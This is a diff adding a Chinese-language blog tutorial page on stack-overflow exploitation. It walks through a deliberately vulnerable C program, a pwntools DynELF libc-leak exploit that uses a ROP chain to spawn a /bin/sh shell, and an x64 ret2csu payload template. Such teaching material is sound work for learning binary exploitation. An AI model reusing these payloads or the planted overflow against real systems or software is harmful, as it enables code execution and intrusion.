@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="DynELF当我们未知一个程序的libc版本时，可能就没法使用ret2libc或者ret2plt，这时我们可以考虑使用DynELF来获取我们所需要的地址，pwntools中已经自带了强大的工具 首先举一个带有漏洞的例子程序 123456789101112131415#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;stdlib.h&amp;gt;#include&amp;lt;unistd.h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈栈溢出填充布局-2">
+<meta property="og:url" content="http://yoursite.com/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="DynELF当我们未知一个程序的libc版本时，可能就没法使用ret2libc或者ret2plt，这时我们可以考虑使用DynELF来获取我们所需要的地址，pwntools中已经自带了强大的工具 首先举一个带有漏洞的例子程序 123456789101112131415#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;stdlib.h&amp;gt;#include&amp;lt;unistd.h">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-12-24T19:30:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浅谈栈溢出填充布局-2">
+<meta name="twitter:description" content="DynELF当我们未知一个程序的libc版本时，可能就没法使用ret2libc或者ret2plt，这时我们可以考虑使用DynELF来获取我们所需要的地址，pwntools中已经自带了强大的工具 首先举一个带有漏洞的例子程序 123456789101112131415#include&amp;lt;stdio.h&amp;gt;#include&amp;lt;stdlib.h&amp;gt;#include&amp;lt;unistd.h">
+  <link rel="canonical" href="http://yoursite.com/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>浅谈栈溢出填充布局-2 | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/23/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">浅谈栈溢出填充布局-2
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-12-23 19:29:50" itemprop="dateCreated datePublished" datetime="2019-12-23T19:29:50-08:00">2019-12-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Bearbeitet am</span>
+                <time title="Geändert am: 2019-12-24 11:30:08" itemprop="dateModified" datetime="2019-12-24T11:30:08-08:00">2019-12-24</time>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>当我们未知一个程序的<strong>libc</strong>版本时，可能就没法使用<strong>ret2libc</strong>或者<strong>ret2plt</strong>，这时我们可以考虑使用<strong>DynELF</strong>来获取我们所需要的地址，<strong>pwntools</strong>中已经自带了强大的工具</p>
+<p>首先举一个带有漏洞的例子程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    write(STDOUT_FLENO,<span class="string">"Hello,World\n"</span>,<span class="number">13</span>);</span><br><span class="line">    <span class="comment">//STDOUT_FLENO = 1,13 = 13 char</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实这里可以说一下在<strong>UNIX</strong>一些系统调用中使用到<strong>STDIN_FILENO</strong>表示标准输入,<strong>STDOUT_FILENO</strong>表示标准输出，<strong>STDERR_FILENO</strong>表示标准出错，使用时需要加头文件<strong>&lt;unistd.h&gt;</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard file descriptors. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDIN_FILENO 0 <span class="comment">/* Standard input. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDOUT_FILENO 1 <span class="comment">/* Standard output. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDERR_FILENO 2 <span class="comment">/* Standard error output. */</span></span></span><br></pre></td></tr></table></figure>
+
+<p>首先看一下完整的<strong>EXP</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./rop_sample"</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">vulfunc_addr = <span class="number">0x0804844b</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./rop_sample"</span>)</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./rop_sample'</span>))</span><br><span class="line"></span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a024</span></span><br><span class="line">pppr = <span class="number">0x0804850d</span> <span class="comment"># no PIE</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###sending payload2 ...###"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>首先来分析一下leak函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> %(address,(data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+
+<p>使用<strong>DynELF</strong>的关键是找到一个<strong>vulfunc</strong>函数去构建<strong>leak</strong>函数，其中vulfunc函数的特征是具有可无限次读写内存地址的能力，比如例子中的<strong>vul_func</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们执行<strong>vul_func</strong>的时候，可以向<strong>bss</strong>段写入一段数据，且存在栈溢出，我们就可以控制它在<strong>read</strong>函数和write函数之间来回执行，实现无限读写，事实上我们的<strong>payload</strong>也是这样构建的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_write) + p32(vulfunc_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>首先<code>&quot;A&quot;*132</code>是因为<strong>buf</strong>开的栈大小是128个字节，那么只需要再加4个字节覆盖掉<strong>Caller’s EBP</strong>，就可以让我们想要跳转的地址覆盖掉 <strong>Ret Addr</strong>，这里我们是<strong>write</strong>函数，然后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(vulfunc_addr) + p32(1) + p32(address) + p32(4)</span><br></pre></td></tr></table></figure>
+
+<p>构成了<strong>write</strong>函数新的栈帧，其中<code>p32(vulfunc_addr)</code>成为了<strong>write</strong>函数的<strong>Ret Addr</strong>，将重新跳回到<strong>vul_func</strong>重复读写，然后<code>p32(1)</code>就是write函数的第一个参数<strong>STDOUT_FILENO</strong>，然后<code>p32(address)</code>就是我们希望暴露的地址，最后一个<code>p32(4)</code>是我们<strong>write</strong>函数读取的字节数，因为我们就读取了一个<code>p32(address)</code>就是32位系统下的指针，也就是4个字节</p>
+<p>然后<code>data = p.recv(4)</code>，也是因为我们希望得到的是一个32位系统的地址指针，也就是4字节，如果是64位系统就是8个字节</p>
+<p>然后我们完成了leak函数的构造，接下来我们只需要调用<strong>pwntools</strong>里面的工具就ok了，就可以获得我们想要的地址了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, elf=ELF(&apos;./rop_sample&apos;))</span><br><span class="line">system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>payload2</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">"A"</span>*<span class="number">132</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">0</span>)</span><br><span class="line">paylaod2 += p32(system_addr) + p32(vulfunc_addr) + p32(bss_addr)</span><br></pre></td></tr></table></figure>
+
+<p>就是我们先调用<strong>read</strong>函数手动输入<strong>“bin/sh“</strong>到<strong>bss</strong>段地址，<strong>pppr</strong>就是<strong>pop*3+ret</strong>，<strong>pop*3</strong>就是为了栈平衡，因为<strong>read</strong>函数引入了三个参数，然后<strong>ret</strong>就会<strong>ret</strong>到<strong>system_addr</strong>开始调用<strong>system</strong>函数，因为第二个参数是<strong>bss_addr</strong>，之前我们已经在<strong>bss</strong>上放入了<strong>“bin/sh”</strong>，事实上就执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(‘/bin/sh’)</span><br></pre></td></tr></table></figure>
+
+<h2 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h2><p>首先是x64最为重要的两个变化</p>
+<ul>
+<li>应用程序地址空间的改变</li>
+<li>参数传参方式的改变（<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、<strong>R8</strong>、<strong>R9</strong>）+<strong>Stack</strong></li>
+</ul>
+<p>比如我们调用一个<strong>write</strong>函数的汇编，因为这些数据只用32位就可以，所以是<strong>edx</strong>或者<strong>esi</strong>这类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov edx,oxd //argv[2]</span><br><span class="line">mov esi,0x400644 // argv[1]</span><br><span class="line">mov edi,0x1 //argv[0]</span><br><span class="line">call 0x400430&lt;write@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们一般传参常用的Gadgets就是以下三个</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget1 = mov rdx,r13 | mov rsi,r14 | mov edi,r15d | call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>call    qword ptr [r12+rbx*8]</code>就是我们希望调用的函数，然后<code>mov rdx,r13</code>就是第三个参数，<code>mov rsi,r14</code>是第二个参数，<code>mov edi,r15d</code>是第四个参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget2 = pop rbx | pop rbp | pop r12 | pop r13 | pop r14 | pop r15 | ret</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gadget3 = pop rdi | ret</span><br></pre></td></tr></table></figure>
+
+<p>常见模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">csu_front_addr = <span class="number">0x0000000000400600</span> <span class="comment">#gadget1 mmmc</span></span><br><span class="line">csu_end_addr = <span class="number">0x000000000040061A</span> <span class="comment">#gadget2 ppppppr</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span> </span><br><span class="line"><span class="comment">#32位 fakeebp是4个字节， 64位为8个字节</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'\x90'</span> * <span class="number">0x38</span> <span class="comment">#nop</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果希望使用<strong>write</strong>函数暴露地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csu(0, 1, write_got, 8, write_got, 1, main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>一般接受用的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write_addr = u64(p.recv(8))</span><br></pre></td></tr></table></figure>
+
+<p>这里有个<strong>Tips</strong>，一般我们要搜索<strong>libc</strong>里面的函数地址就用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.symblos[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>字符串就用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc.search[&quot;xxxx&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>在gdb里面可以用bt命令展示各函数的起始地址</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/12/22/╟│╠╕╒╗╥τ│÷╠ε│Σ▓╝╛╓-1/" rel="next" title="浅谈栈溢出填充布局-1">
+                  <i class="fa fa-chevron-left"></i> 浅谈栈溢出填充布局-1
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/12/30/ARM╙δQEMU-Tips-1/" rel="prev" title="ARM与QEMU-Tips-1">
+                  ARM与QEMU-Tips-1 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#DynELF"><span class="nav-number">1.</span> <span class="nav-text">DynELF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#64位"><span class="nav-number">2.</span> <span class="nav-text">64位</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
